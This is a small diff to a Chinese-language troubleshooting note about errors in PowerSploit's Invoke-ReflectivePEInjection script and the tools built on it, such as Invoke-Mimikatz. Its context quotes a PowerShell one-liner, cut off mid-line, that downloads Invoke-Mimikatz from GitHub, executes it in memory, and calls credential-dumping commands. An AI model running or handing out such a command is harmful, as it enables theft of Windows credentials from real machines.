@@ -2,6 +2,7 @@
 
 报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。  
 * 错误信息如下:
+
 ```powershell
 PS C:\WINDOWS\system32> iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShe
 llMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::lo
